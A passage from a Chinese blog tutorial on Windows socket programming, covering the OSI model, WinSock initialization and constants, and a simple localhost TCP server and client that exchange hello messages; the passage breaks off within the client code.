    <content><![CDATA[<h1 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h1><h2 id="网络基础知识"><a href="#网络基础知识" class="headerlink" title="网络基础知识"></a>网络基础知识</h2><h3 id="网络OSI模型"><a href="#网络OSI模型" class="headerlink" title="网络OSI模型"></a>网络OSI模型</h3><p>网络OSI7层模型（Open Systems Interconnection）即开放系统互联。它是由ISO（Internet Organization for Standardization）制定</p>
<p>OSI时网络通讯的一种通用框架，它分为七层</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>层</th>
</tr>
</thead>
<tbody><tr>
<td>7</td>
<td>应用层（Application）</td>
</tr>
<tr>
<td>6</td>
<td>表示层（Presentation）</td>
</tr>
<tr>
<td>5</td>
<td>会话层（Session）</td>
</tr>
<tr>
<td>4</td>
<td>传输层（Transport）-&gt;TCP&#x2F;UDP</td>
</tr>
<tr>
<td>3</td>
<td>网络层（NetWork）</td>
</tr>
<tr>
<td>2</td>
<td>数据链路层（Data Link）</td>
</tr>
<tr>
<td>1</td>
<td>物理层（Physical）</td>
</tr>
</tbody></table>
<p>但不是所有网络通信都必须经过这7层模型，比如同一网段下两台计算机的交互，只需要经过物理层和数据链路层就够了。</p>
<p>网络上最重要的就是IP，IP就在网络层。</p>
<span id="more"></span>

<h2 id="Windows-Socket"><a href="#Windows-Socket" class="headerlink" title="Windows Socket"></a>Windows Socket</h2><h3 id="什么是套接字（Socket）"><a href="#什么是套接字（Socket）" class="headerlink" title="什么是套接字（Socket）"></a>什么是套接字（Socket）</h3><p>Socket又称套接字，它是TCP&#x2F;IP网络环境下应用程序与底层通信驱动程序之间运行的开发接口.它可以将应用程序与具体的TCP&#x2F;IP隔离开.使得应用程序不需要了解TCP&#x2F;IP的细节，就能够实现传输。</p>
<h3 id="套接字的服务方式和类型"><a href="#套接字的服务方式和类型" class="headerlink" title="套接字的服务方式和类型"></a>套接字的服务方式和类型</h3><p>根据底层协议的不同，Socket开发接口可以提供面向连接和无连接二种服务方式。</p>
<p>在Socketi通信中，套接字分为3种类型。</p>
<p>1.流式套接字.SOCK_STREAM</p>
<p>流式套接字是面向连接的、提供双向、有序、无重复且无记录边界的数据流服务，适用于处理大量数据，可靠性高，但开销也大。</p>
<p>2.数据报式套接字SOCK_DGRAM</p>
<p>UDP，一般应用在传输音视频文件，容许少量丢包</p>
<p>3.原始套接字</p>
<p>其中SOCK_STREAM、SOCK_DGRAM工作在传输层，SOCK_RAW工作在网络层。</p>
<h3 id="构建WinSock应用程序框架"><a href="#构建WinSock应用程序框架" class="headerlink" title="构建WinSock应用程序框架"></a>构建WinSock应用程序框架</h3><p>WinSock包含了两个主要的版本，即Socket1和winsock2，我们一般使用2<br>在使用时，需要包含如下头文件和lib文件<br>#include &lt;WinSock2.h&gt;<br>#pragma comment(lib,”ws2_32.lib”)</p>
<p>还需要初始化WinSocket<br>Int WSAAPI WSAStartup(WORD wVersionRequested &#x2F;&#x2F;版本号,LPWSADATA IpWSAData);		WSAData结构用于存放返回的Socket数据</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD wVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);	 <span class="comment">//版本号</span></span><br><span class="line">    WSADATA wsaData;				<span class="comment">// 一个结构体，用来返回数据</span></span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(wVersion, &amp;wsaData))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup successed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WSAData，存放Winsock返回的初始化信息：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">WSAData</span> &#123;</span></span><br><span class="line">    WORD wVersion;	<span class="comment">// Socket DLL期望用户使用的规范版本</span></span><br><span class="line">    WORD wHighVersion;	<span class="comment">// 可以支持的最高版本</span></span><br><span class="line">    <span class="type">char</span> szDescription[WSADESCRIPTION_LEN+<span class="number">1</span>];	<span class="comment">// 描述字符串</span></span><br><span class="line">    <span class="type">char</span> szSystemStatus[WSASYSSTATUS_LEN+<span class="number">1</span>];	<span class="comment">// 状态字符串</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> iMaxSockets;	<span class="comment">// 套接字的最大编号（WinSock2或稍后的版本忽略了该字段）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> iMaxUdpDg; <span class="comment">// 忽略</span></span><br><span class="line">    <span class="type">char</span> FAR * lpVendorInfo;	<span class="comment">// 废弃</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/05/CInternet/image-20240708231715068.png" alt="image-20240708231715068"></p>
<h3 id="IP地址的表现形式"><a href="#IP地址的表现形式" class="headerlink" title="IP地址的表现形式"></a>IP地址的表现形式</h3><p>IP地址常用点分法来表示比如192.168.0.1，即4个0-255的整数表示</p>
<p>但是在计算机中不使用点分法来保存IP地址.这样会浪费存诸空间.而且不便于根据IP地址和子网掩码来计算子网信息<br>所以在计算机中使用无符号长整形数来存诸表示IP地址<br>1.网络字节顺序(NetWork Byte Order,NBO)<br>在网络传送中，IP地址被保存为32位的二进制数在低位存储地址中保存数据的高位字节这种存储顺序格式被称为网络字节顺序.数据按照32位的二进制数为一组进行传输。因为采用网络字节顺序，所以数据的传输顺序是由高到低的。<br>在VC中使用In_addr来保存IP地址。 inet_addr和 inet_ntoa</p>
<p>in_addr：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span> UCHAR s_b1,s_b2,s_b3,s_b4; &#125; S_un_b;	<span class="comment">//点分法保存</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span> USHORT s_w1,s_w2; &#125; S_un_w;			<span class="comment">//分两部分保存</span></span><br><span class="line">        ULONG S_addr;								<span class="comment">//保存为32位</span></span><br><span class="line">    &#125; S_un;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> s_addr  S_un.S_addr <span class="comment">/* can be used for most tcp &amp; ip code */</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> s_host  S_un.S_un_b.s_b2    <span class="comment">// host on imp</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> s_net   S_un.S_un_b.s_b1    <span class="comment">// network</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> s_imp   S_un.S_un_w.s_w2    <span class="comment">// imp</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> s_impno S_un.S_un_b.s_b4    <span class="comment">// imp #</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> s_lh    S_un.S_un_b.s_b3    <span class="comment">// logical host</span></span></span><br><span class="line">&#125; IN_ADDR, *PIN_ADDR, FAR *LPIN_ADDR;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/05/CInternet/image-20240709130551236.png" alt="image-20240709130551236"></p>
<p>2.主机字节顺序(Host Byte Order，HBO)两种格式<br>不同的主机在对IP地址进行存储时使用的格式也不同，所以需要通过下列四个函数<br>来实现主机和网络字节顺序的互转<br>htonl 将主机字节顺序格式IP地址转换成为TCP&#x2F;IP网络字节顺序			Host to Net u_long<br>htons主机转网络u_short型<br>ntohl网络转主机 u_long			Net to Host u_long<br>ntohs网络转主机 u_short</p>
<h3 id="WinSock-TCP-IP连接流程"><a href="#WinSock-TCP-IP连接流程" class="headerlink" title="WinSock TCP&#x2F;IP连接流程"></a>WinSock TCP&#x2F;IP连接流程</h3><table>
<thead>
<tr>
<th>服务端</th>
<th>客户端</th>
</tr>
</thead>
<tbody><tr>
<td>1.建立流式套接字</td>
<td>1.建立流式套接字</td>
</tr>
<tr>
<td>2.套接字：与本地地址绑定</td>
<td></td>
</tr>
<tr>
<td>3.通知TCP服务器准备连接</td>
<td></td>
</tr>
<tr>
<td>4.等待客户端的连接</td>
<td>2.将套接字与远程主机连接</td>
</tr>
<tr>
<td>5.建立连接</td>
<td></td>
</tr>
<tr>
<td>6.在套接字上读写数据</td>
<td>3.在套接字上读写数据</td>
</tr>
<tr>
<td>7.关闭套接字</td>
<td>4.关闭套接字结束对话</td>
</tr>
<tr>
<td>8.关闭最初的套接字，结束服务</td>
<td></td>
</tr>
</tbody></table>
<p><img src="/2024/07/05/CInternet/image-20240709205503926.png" alt="image-20240709205503926"></p>
<p>地址族：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNSPEC       0               <span class="comment">// unspecified</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNIX         1               <span class="comment">// local to host (pipes, portals)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_INET         2               <span class="comment">// internetwork: UDP, TCP, etc.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IMPLINK      3               <span class="comment">// arpanet imp addresses</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_PUP          4               <span class="comment">// pup protocols: e.g. BSP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_CHAOS        5               <span class="comment">// mit CHAOS protocols</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NS           6               <span class="comment">// XEROX NS protocols</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IPX          AF_NS           <span class="comment">// IPX protocols: IPX, SPX, etc.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ISO          7               <span class="comment">// ISO protocols</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_OSI          AF_ISO          <span class="comment">// OSI is ISO</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ECMA         8               <span class="comment">// european computer manufacturers</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_DATAKIT      9               <span class="comment">// datakit protocols</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_CCITT        10              <span class="comment">// CCITT protocols, X.25 etc</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_SNA          11              <span class="comment">// IBM SNA</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_DECnet       12              <span class="comment">// DECnet</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_DLI          13              <span class="comment">// Direct data link interface</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_LAT          14              <span class="comment">// LAT</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_HYLINK       15              <span class="comment">// NSC Hyperchannel</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_APPLETALK    16              <span class="comment">// AppleTalk</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETBIOS      17              <span class="comment">// NetBios-style addresses</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_VOICEVIEW    18              <span class="comment">// VoiceView</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_FIREFOX      19              <span class="comment">// Protocols from Firefox</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNKNOWN1     20              <span class="comment">// Somebody is using this!</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_BAN          21              <span class="comment">// Banyan</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ATM          22              <span class="comment">// Native ATM Services</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_INET6        23              <span class="comment">// Internetwork Version 6</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_CLUSTER      24              <span class="comment">// Microsoft Wolfpack</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_12844        25              <span class="comment">// IEEE 1284.4 WG AF</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IRDA         26              <span class="comment">// IrDA</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETDES       28              <span class="comment">// Network Designers OSI &amp; gateway</span></span></span><br></pre></td></tr></table></figure>

<p>套接字类型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SOCK_STREAM     1               <span class="comment">/* stream socket */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCK_DGRAM      2               <span class="comment">/* datagram socket */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCK_RAW        3               <span class="comment">/* raw-protocol interface */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCK_RDM        4               <span class="comment">/* reliably-delivered message */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCK_SEQPACKET  5               <span class="comment">/* sequenced packet stream */</span></span></span><br></pre></td></tr></table></figure>

<p>套接字使用的协议：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0501)</span></span><br><span class="line">    IPPROTO_HOPOPTS       = <span class="number">0</span>,  <span class="comment">// IPv6 Hop-by-Hop options</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0501)</span></span></span><br><span class="line">    IPPROTO_ICMP          = <span class="number">1</span>,</span><br><span class="line">    IPPROTO_IGMP          = <span class="number">2</span>,</span><br><span class="line">    IPPROTO_GGP           = <span class="number">3</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0501)</span></span><br><span class="line">    IPPROTO_IPV4          = <span class="number">4</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0501)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0600)</span></span><br><span class="line">    IPPROTO_ST            = <span class="number">5</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0600)</span></span></span><br><span class="line">    IPPROTO_TCP           = <span class="number">6</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0600)</span></span><br><span class="line">    IPPROTO_CBT           = <span class="number">7</span>,</span><br><span class="line">    IPPROTO_EGP           = <span class="number">8</span>,</span><br><span class="line">    IPPROTO_IGP           = <span class="number">9</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0600)</span></span></span><br><span class="line">    IPPROTO_PUP           = <span class="number">12</span>,</span><br><span class="line">    IPPROTO_UDP           = <span class="number">17</span>,</span><br><span class="line">    IPPROTO_IDP           = <span class="number">22</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0600)</span></span><br><span class="line">    IPPROTO_RDP           = <span class="number">27</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0600)</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0501)</span></span><br><span class="line">    IPPROTO_IPV6          = <span class="number">41</span>, <span class="comment">// IPv6 header</span></span><br><span class="line">    IPPROTO_ROUTING       = <span class="number">43</span>, <span class="comment">// IPv6 Routing header</span></span><br><span class="line">    IPPROTO_FRAGMENT      = <span class="number">44</span>, <span class="comment">// IPv6 fragmentation header</span></span><br><span class="line">    IPPROTO_ESP           = <span class="number">50</span>, <span class="comment">// encapsulating security payload</span></span><br><span class="line">    IPPROTO_AH            = <span class="number">51</span>, <span class="comment">// authentication header</span></span><br><span class="line">    IPPROTO_ICMPV6        = <span class="number">58</span>, <span class="comment">// ICMPv6</span></span><br><span class="line">    IPPROTO_NONE          = <span class="number">59</span>, <span class="comment">// IPv6 no next header</span></span><br><span class="line">    IPPROTO_DSTOPTS       = <span class="number">60</span>, <span class="comment">// IPv6 Destination options</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0501)</span></span></span><br><span class="line"></span><br><span class="line">    IPPROTO_ND            = <span class="number">77</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0501)</span></span><br><span class="line">    IPPROTO_ICLFXBM       = <span class="number">78</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0501)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0600)</span></span><br><span class="line">    IPPROTO_PIM           = <span class="number">103</span>,</span><br><span class="line">    IPPROTO_PGM           = <span class="number">113</span>,</span><br><span class="line">    IPPROTO_L2TP          = <span class="number">115</span>,</span><br><span class="line">    IPPROTO_SCTP          = <span class="number">132</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0600)</span></span></span><br><span class="line">    IPPROTO_RAW           = <span class="number">255</span>,</span><br><span class="line"></span><br><span class="line">    IPPROTO_MAX           = <span class="number">256</span>,</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  These are reserved for internal use by Windows.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    IPPROTO_RESERVED_RAW  = <span class="number">257</span>,</span><br><span class="line">    IPPROTO_RESERVED_IPSEC  = <span class="number">258</span>,</span><br><span class="line">    IPPROTO_RESERVED_IPSECOFFLOAD  = <span class="number">259</span>,</span><br><span class="line">    IPPROTO_RESERVED_WNV = <span class="number">260</span>,</span><br><span class="line">    IPPROTO_RESERVED_MAX  = <span class="number">261</span></span><br><span class="line">&#125; IPPROTO, *PIPROTO;</span><br></pre></td></tr></table></figure>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET server_fd, new_socket;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>;</span></span><br><span class="line">    <span class="type">int</span> addrlen = <span class="keyword">sizeof</span>(address);</span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from server&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((server_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定socket到端口</span></span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, <span class="keyword">sizeof</span>(address)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind failed&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听</span></span><br><span class="line">    <span class="keyword">if</span> (listen(server_fd, <span class="number">3</span>) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接受新连接</span></span><br><span class="line">    <span class="keyword">if</span> ((new_socket = accept(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, &amp;addrlen)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取客户端发送的数据</span></span><br><span class="line">    iResult = recv(new_socket, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Connection closing...\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">        closesocket(new_socket);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据到客户端</span></span><br><span class="line">    send(new_socket, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    closesocket(new_socket);</span><br><span class="line">    closesocket(server_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET client_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from client&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((client_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器地址</span></span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    serv_addr.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将IP地址从字符串转换为网络地址</span></span><br><span class="line">    <span class="keyword">if</span> (inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;serv_addr.sin_addr) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;inet_pton failed&quot;</span>);</span><br><span class="line">        closesocket(client_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接到服务器</span></span><br><span class="line">    <span class="keyword">if</span> (connect(client_fd, (<span class="keyword">struct</span> sockaddr *)&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;connect failed&quot;</span>);</span><br><span class="line">        closesocket(client_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据到服务器</span></span><br><span class="line">    send(client_fd, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取服务器发送的数据</span></span><br><span class="line">    iResult = recv(client_fd, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Connection closed\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    closesocket(client_fd);</span><br><span class="line">    